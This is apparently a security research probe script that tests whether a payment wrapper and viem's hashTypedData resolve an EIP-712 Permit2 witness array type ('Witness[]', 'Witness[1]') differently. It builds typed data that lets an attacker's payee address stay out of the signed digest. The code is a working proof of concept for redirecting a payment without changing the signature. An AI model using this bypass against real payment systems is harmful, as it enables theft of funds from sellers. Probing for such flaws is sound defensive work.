/**
 * PROBE 8 — the walker resolves the witness struct BY STRING.
 *
 * extractPayment reads the witness type name out of the declaration:
 *     witnessType = types.PermitWitnessTransferFrom.find(f => f.name === "witness").type
 * and then asks `missingCommitment(types, witnessType, [["to","address"]])`.
 *
 * That treats the type NAME as a key into `types`. viem does not: for an ARRAY
 * type it strips the brackets and looks up the ELEMENT type. So `Witness[]` is
 * two different lookups on the two sides — `types["Witness[]"]` for the wrapper,
 * `types["Witness"]` for the digest. If both exist and disagree, the wrapper
 * validates a declaration the signature never uses.
 */
import { hashTypedData } from "viem";

const SELLER = "0x209693Bc6afc0C5328bA36FaF03C514EF312287C";
const ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF";

console.log("=== 8a. does structuredClone preserve a non-index own prop on an array? ===");
{
  const w = [{}];
  w.to = SELLER;
  const c = structuredClone({ witness: w });
  console.log(`  Array.isArray(clone.witness) = ${Array.isArray(c.witness)}`);
  console.log(`  clone.witness.to = ${c.witness.to}`);
  console.log(`  clone.witness.length = ${c.witness.length}`);
}

console.log("\n=== 8b. which key does viem use for a `Witness[]` field? ===");
{
  const types = {
    PermitWitnessTransferFrom: [
      { name: "permitted", type: "TokenPermissions" },
      { name: "spender", type: "address" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
      { name: "witness", type: "Witness[]" },
    ],
    TokenPermissions: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    // What the WRAPPER will validate (it looks up the literal string "Witness[]"):
    "Witness[]": [{ name: "to", type: "address" }],
    // What VIEM will actually hash (element type, no `to` at all):
    Witness: [{ name: "unrelated", type: "uint256" }],
  };
  const mk = (to) => {
    const witness = [{ unrelated: 7n }];
    witness.to = to;
    return {
      domain: { name: "Permit2", chainId: 84532, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
      types,
      primaryType: "PermitWitnessTransferFrom",
      message: {
        permitted: { token: "0x036CbD53842c5426634e7929541eC2318f3dCF7e", amount: 10_000n },
        spender: "0x1111111111111111111111111111111111111111",
        nonce: 1n,
        deadline: 4_000_000_000n,
        witness,
      },
    };
  };
  const hash = (to) => {
    try {
      return hashTypedData(mk(to));
    } catch (e) {
      return `THREW: ${String(e.message).split("\n")[0]}`;
    }
  };
  const a = hash(SELLER);
  const b = hash(ATTACKER);
  console.log(`  witness.to=SELLER   ${a}`);
  console.log(`  witness.to=ATTACKER ${b}`);
  console.log(
    a === b && String(a).startsWith("0x")
      ? "  >> COLLISION: viem used types.Witness; the payee is not in the digest"
      : "  >> no collision",
  );
}

console.log("\n=== 8c. same trick with a FIXED-SIZE array `Witness[1]` ===");
{
  const types = {
    PermitWitnessTransferFrom: [
      { name: "permitted", type: "TokenPermissions" },
      { name: "spender", type: "address" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" },
      { name: "witness", type: "Witness[1]" },
    ],
    TokenPermissions: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    "Witness[1]": [{ name: "to", type: "address" }],
    Witness: [{ name: "unrelated", type: "uint256" }],
  };
  const hash = (to) => {
    const witness = [{ unrelated: 7n }];
    witness.to = to;
    try {
      return hashTypedData({
        domain: { name: "Permit2", chainId: 84532, verifyingContract: "0x000000000022D473030F116dDEE9F6B43aC78BA3" },
        types,
        primaryType: "PermitWitnessTransferFrom",
        message: {
          permitted: { token: "0x036CbD53842c5426634e7929541eC2318f3dCF7e", amount: 10_000n },
          spender: "0x1111111111111111111111111111111111111111",
          nonce: 1n,
          deadline: 4_000_000_000n,
          witness,
        },
      });
    } catch (e) {
      return `THREW: ${String(e.message).split("\n")[0]}`;
    }
  };
  const a = hash(SELLER);
  const b = hash(ATTACKER);
  console.log(`  witness.to=SELLER   ${a}`);
  console.log(`  witness.to=ATTACKER ${b}`);
  console.log(a === b && String(a).startsWith("0x") ? "  >> COLLISION" : "  >> no collision");
}
